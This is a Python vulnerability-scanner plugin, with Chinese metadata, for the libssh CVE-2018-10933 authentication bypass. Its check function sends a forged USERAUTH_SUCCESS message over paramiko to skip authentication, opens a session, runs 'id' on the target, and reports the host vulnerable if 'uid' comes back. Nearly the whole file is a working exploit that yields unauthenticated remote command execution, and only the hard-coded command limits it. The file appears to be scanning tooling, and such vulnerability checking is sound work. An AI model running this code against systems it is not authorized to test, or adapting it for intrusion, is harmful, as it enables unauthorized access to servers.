# coding=utf-8
import sys
import paramiko
import socket

def get_plugin_info():
    plugin_info = {
        "name": "libssh_CVE_2018_10933身份验证绕过漏洞",
        "info": "攻击者可以在没有密钥的情况下成功进行身份验证并获取受影响服务器的 shell",
        "level": "高危",
        "type": "身份验证绕过",
        "author": "zhangdaoyuan@banggood.com",
        "url": "https://github.com/blacknbunny/libSSH-Authentication-Bypass",
        "keyword": "server:ssh",
        "source": 1
    }
    return plugin_info

def check(ip, port, timeout):
    command = 'id'
    bufsize = 2048
    sock = socket.socket()
    try:
        sock.connect((ip, int(port)))
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        client.exec_command(command)

        # stdin = client.makefile("wb", bufsize)
        stdout = client.makefile("rb", bufsize)
        output = stdout.read()

        if 'uid' in output:
            return u"存在libssh_CVE_2018_10933身份验证绕过漏洞"
        stdout.close()

    except:
        pass
